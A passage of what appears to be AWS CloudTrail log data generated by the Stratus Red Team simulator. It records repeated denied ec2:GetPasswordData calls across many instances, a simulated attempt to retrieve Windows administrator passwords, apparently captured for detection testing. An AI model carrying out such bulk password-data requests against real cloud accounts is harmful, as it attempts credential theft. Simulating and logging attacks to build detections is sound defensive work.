JJqi-rC3zfBkVioszXW11DKpcL755AUVY2OJmrbbbxxXyAa3BGd_pEfBQfxB7eAHuDH7CPVmOf4EG1MkQKk06tnOefWSBDhlNi3BYpuA8-6jWQsKOhwShJKF6ZNVSQ6ivlccg3o7A5IShFiKJVQYGTQZ1Rc-PA8hPANFEsT5Gl2Ag1jPol68k8oO_8E4_cHKqQjvZTZJEoMF2tZwAXfrjU-EX2IY-Y9l-ONimiyuPnxchC8HSYViBz4POEKN0gZhid89D3IWLo2k70BQDl6j2L2zIr6yMVsj2v-Wc8saEaiExv7QK4NkT1l2MEEDKANkwVWarRlYlI3ku7f1H8yTqMXf9WPcZ7DfcPXoR9ich6AFDVD8J39S6kgSc9P6cq_V2yssXqcSJxwQqBkbUrPRDMlpj0VgA9qU-Sx81uWiQQTJeK4X9wYHi2RfV6AkHCeIOi5viQVR4xNGVird74cvtcBu1SzMccOkyD0HCBZ9CcnyQ7BohNuzNC17wm0AekIdxH0pZAM3Rb2OAdzXK9zE37qc-Z2F8tGPGsCNJVwP2LSQetbu6tfhJBcQpfFi3WD9Wq8\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"45b5d41d-4732-49d2-aa3b-8b87a1c4d8e1\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"efb7d185-ec2d-431e-b845-52b0ec9f4bc4\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-xjos2kzunblws25p\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: Fy68QK4IDJ5WWq9w6ufOr8E_KHl6yFBFh7qzkE1p4XKkMGsrvTtGPoFbKsz07ZU4sEXIqlr1_TYeFkwdclvyYKs4beqAEnihMn5cbQHdDT6peeTZvDoRvdlJ4K4MAJFsNujyWcC5DMyiCOBwWnn-I2iFxQuRcu6GovxT-uaFg4Sf25imlhuFrUxZzBxBP17gEwNx-64eP-_67QBBcrkJfxs54PTZSqkbAFB-jbJ0UqRE2wCYuVHRvWKlOX6amkuxdKOcGlHx3XJku8BccJZNBkGNBTIvkc3lMysOCeB5HfJDwfIUIuLwCk1hB3tm8NiWmtNnY6NcSGDZi1htncI4dzNGZHfPEHhJBXBzUCJcCfpeKPUNB4MATcztCL_jwfqP24GTqjNsbPsusrVOoBjYoCglljWwr8k2ltTj-bDR-tbLjRm-wkTF_25Gg8v_FvHEvE9inR43IEPtRdw6ULlwVIE-qLaYXhqPJmPrBQyhVCQLsUcIsMlqd6v9NVjIJxXRvmR5KcLJctOTykYZXOwF7Vl4fGNJT9eR11nzkVTxfTZaPwv--34eB6rZoJqJEG4IbyDJ\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c07943fa-79ed-4f9a-9bde-b0eefcece09a\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"8408971c-2a61-40da-8455-3b5cb32e3b6d\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-gjzajayb7tgntj7f\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: HU9P8R2PArR2Z01od-GTeTwJ9fw_N8JCXcNkhA6psJfqSID4sa98rv3UapLRUBuHqmpY_xlLKyLSAx53FDmHmFpcVxr8_7U9ZF0cpa4BNP4o90TZx1aI0rRYJU_zZ0NapeIHGfdZwFFnCV00oJk962hfwW-ufpsJ6ZNBczV-5UD_8yyMUlPA4R5K7v9Wz21OZxLZwrKEgdj5XXdHpbpojqpCl_dgEyhGa8Jddoz8dj1cZcuAmv8BNizrUE3ro7A6wU2NSxVT0o8J105EVaWz6IXuucVfDHhK4uApI7OSTMmJkT6D5K1Vxnbgk57-Qk7HOPOBbIXQhqt7Rc4-d37Bour4o71o72KFl2KYKNdQP2qWtK9uAHk8zaxW2vhjwtG4P9mLH_UEkjmZgVlqTxbyCrY7ErAxJ0Qv37oYOQ0sZO_02fY9haXSXMedpzIbw_EUdSsxw9bPRSQcoeplA6CidjS366eiouQJOOB-iHhut2_70izsKLl0-uSpJO-MKWE9mwYGgVphX9UlhpBUVTrcWBUv3Rx8HE7IfO53Pki4WIsEtKS8wVJ25erdcnWSYMenJj4\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"cf7fcd24-2c91-4836-b460-d01f837d5db4\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"8c5edf57-8692-4d9c-95b2-fae37791fd31\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-awmjjnq5sr691kgp\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: glknbRaK-8bXUVYKsSXr-q5ysgD55hn_KTwTFbjiPl-hGg2ErcgTWmFFDaGHOT23Qbn2I2Cwz07cgPqRLkJsh1mM3TAlZ1yIdjjeuv9cT1eX6tMqem1qrm8qRbWxi97j9KBGu2yHsXm7yHi19qM_ddWyutsm-NXqG2e13FsP8KxPrtQkxXQi4bvZ30HHpv4hqS6-06bUEbTJFbU9-PBuCowkQDXJs7EPuR5YhlXBWqoahCNXc6V_bOKz6rR1sJOD0nZvbIqPompZur2cyAItV0kfQl4SH6rzvkk2T2jVnDz5NU-xnvUJzN3nnsc3LXjOUsBfHu4_JQPfonyRqewfQ06vhnU3gzS_0TkT_VbEq-1PBmtTRXFGEQ9nPDMQuserPuhSn8P8o5dj9uwBaLR-hZPqN64-R1mUyWuQUh3RtkwI5MqEQFu-KSmZn3TDovoqZu9uayFJaMUzdyzVqpAyB5eg9ycClfZFgYchEACGkISXj1k5iyWUWr8lnVrPhXv5I3ERGvOP4gQl2VQS0SZx30DT5ReGWKxWwsElmxJeeyu7ZjsN0W-bNPJ9gBf23hRTrzM6\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ec79b60b-6bc0-4a75-bf79-45a42db477df\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"9ab8de47-15e2-4e13-9a14-8eab5c92b916\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-nzv1jjfn03nnujti\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: gEXNHHFUYw8y_MNHkGP-98XPXSVvkMEu28ZFGcP89GKZ1im05s9P4sCpRKtajVvAJzfILfA2xEmN6aR06VV6qdmstPr95kfAhvHsY0yeIjJHz1pXj_ZNO0Q9SiV-ZaAcjH9LK5Pl8muiUU2j5onTFYWbDW1IqS-myHOBQFcs3jUEvCxbdnSHwxmeVLSrHkZEbg8cWkelKkcyJokNcad7MWVbmfJNeHLaizgZfyF69MLAnHTAlC0VaxNd8m7UbkZYydMATTAMNdrvUxRhZ0LOq8yecg47kGfUUM8K-uZk0qzunzC9IZ1EGHHAQjtI9VEf9HskSA6ibh8j4BhfBguxnf6USGHIq7R9Igt5bmZ1fq-COIzGblYOecicHfilaPeEevmzbT7vcW-3dgRPK-zr04-H_0o7wyGU34mZlmfV823uG4oM0nB4JuPNd7Shflry7deP_3nvj-Aqy73d7GPicewhRVEKYDeFao0c5EevJemsepKqc6GDe-Tc6GKL5UBG8payl624Eq4NGHZa4lKuMC4t1Y3dHs1bsxu5QU2jLeVXArdLBstATsRblT-CXKDw_Is\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f2d94374-18b0-4479-8585-d24f7a58e3de\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"fec853a7-4df0-4410-8d1b-d86e0cf20bd8\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-gz7w6xbdutwhlvb2\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: nKaaIO7OhRx8_gh9WeWoXY6JtQq4rPq82-RZz4uYdRG1pdkeJx75OQ_4cv9JyQYlF4vgjg1TeP6vSXcI14XZYu1DA0hgqnYqyqKFFPCQglgRqfKLTphNoCprin_-yalFcBYAhOyfy7thU8TNTKX26Eg1D9JRE8kpcomB9ov9PUQS1v_doljaouQaQXBrlh8YD5cWbHXlkf0Ahi1axtD4qCsz9stzfYLtxwr-KWXKPgwQA36-8j-vzgFUAFCvDMSOS_7IRUh662UyfPDRnuJeigPHeHdNSvdr9F9TH-Cht9GaFF_kFBKWkr-RkL0DYAOFKw2_T1g24bk_j7JYINyHIhS5MDihvlmKaAHH0Yoz_nrOI4gbdL60CH9Bhw8E-7t7cI7_Jqplqey3rTvzxMNVdpxtk3aku0as4ZAEM_LPElxfs8ZZmfY3-NuanGt0MFcPYxDmbaNFRhOk3-m0esaVTf8OsHCbeXE2erqZUWrgh3-96jx6t9hSQwdRsaqvzImXiX87EjO0-zKxmZlT98xRprqw_Lr-hdC3IEVh6wY8YFYjFOh5I4RcTO-bRkxZgH1Qfvw\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"396d8a62-46e7-472f-b046-5c41a75ae61b\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"d4fb9e08-37ef-4cc0-9d01-0dc7c694e554\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-bf83vbyeoo24svtd\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: nH73aM11PlKi-yyEWJlllJTikqqhwda0HamvlmHPY53dt3gaTJVbwGB1zVfdkb7oqY9N_9d-v9oqHixcCcMcOYBwBQBnJ-rVW4FxsjBI0pPSVYoTYOagpkUT7ceRLKyXWDgR70ylwVOyaKu7AJsCvSy_A2_bi2W8BirGWL3H7-Nyeu3LaKK9lL6olrz6qla9_veiB75Cc516dE-gsAKNm4jd_N1pC-WCMApGlCIYsqrv0j2gSKjP2SNlDaINPL35dcSA8syYNt36SwsgYVo3DUPCrad2W1fQ4R8Wim_GPLJwPYueFvttYNWEiPBj7sd_Zb5yLvPKRCtrxu-eYbYue1BWthbbxVoKfecgieELohPNj0MtdEjKY1kAyMnrho2QyOjdGpuX4C4gTeCytuDrunH5bDRKRtlAGPhRCsIfGFsrq-fTS_FhgDXjMc04NcJr4AZ9j6yGf4u6vMosWFi6Wg70n-W0AluNUBNHVcnXO4mvG09tBNLOmx66LwCs90A5_G2ll6_Py2vP3pXoVXUdG4rpJJhMwmVH7FYE2fA0fgV7Gr-f_yjzL-CiMiB3UNWlv2oX\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"71ce0541-113b-4b74-bbc7-5ef364318787\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"12c55ab8-8de3-4d11-9cb5-771de13610b0\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-qsdkik5t0ihwxj43\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: 1doSO4EeN8VCyyAelPL_ne9oDrtREHT9ciU3ZTtSs1As1v3mEHCVpeUarJxr13AWmsoIt2_yTzT1NE4Ur1yK9S0V-B6omwpgEEnGk2ZPzhrkCqSRA1flcMwIKXKchWoDB4--TAgAfHyUem-MO9IRc4RIJniE-BNY-kK_GOR5BR7y9yTy83SMANMBHFgY_zDY3Qlco5B0jmuXRnhSJXslqpL7KlXdxTLK-j1gOFIrWpZll3E8WQdCw3Sth3Btvxgj98rNDa2vfqGOxIacu5PDLDvvDTD9Dad5ceUN5g5sYwbTZKX4nbRm7UC9kp_hN_heYILrJR68VF2HTGqOl04-T-aygq12V-WB82BR_oXAuZyOrTHoUw8H42WSiYb_VP_Se3xoS6QEGsK165umOB8-ruZXG0J9M4EZgptI7b1krm2VbO5wur3JTjY6m4kiNT0baMvI_2CGhP5hduu06rllFf4Q0hAqqvHC1wsqoEUe0A36xOj9RcKL_rxQ_XR8gnLd_l2-9OCmGk3usYbhZeb1jJboZclzyYXoCCfx-nJvGlICE9OP_sutVFynLyT9QG_-dv8\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8aa69c7f-117d-4010-b7ea-009cd1f4f5de\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"9f89f20e-ca42-4d5b-afec-fa2da8f55fd3\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-jcoba14jc619sc9k\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: RKjtBacdHpynSBYD2rFJAJyGRi896ep_wzschdrXXGuhTWwH1op5v_VJ1oUbV33AF8uOXxrkx7rjRJIBPku6lhMASNBInXuS-tBXw9GRd3fB4Yh6u0kxQZP95-RRCNoRGc21BTmVEegMgNPhXMG7gxA1HUJVcjVAwAbMUzBv1VEvYhHPsOm-SDbCR_vlJbJC3dtDLetZuxLoTTrcKhMMU3pazWx_MCTEV5Fn13SJMV13Hmoi_x2JrCUfAVZdO4bDePX_kyk2H9XuBmiQAg-h5Ba3HvkUQP-wBNC9cQ_Ji37Vx8oBQO2SxdqXiLHbx4W3AaI4ag5iDuOURa12a_xoUAUrP7RB2iKgr59mpC6IK8JUtDwRlv5jKYwfQMC3TtvvDtTmL3Ljxoz07_fgCECADIANklTbTKnfByZZ8XWzURr5mGxHAQC2GrDHaoJpt84x-k-9-AGNEVbOFycJJsDOfUSTQQvKIBq2CIos8bKwnZJQCVOYCwgHDqmhXyS8KaQw4OWQleQKMvfp8aZ3Q9gFxlSJbo00UqiAIHWVOUl5xhL0reKKGrL5ve6mBnQAVPY93get\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9fa0f6c4-dafd-46e6-af33-264c70b79add\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"894f1727-ca4f-4376-8313-51b8e5632526\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-yqe6th46jb26scec\"\n      },\n      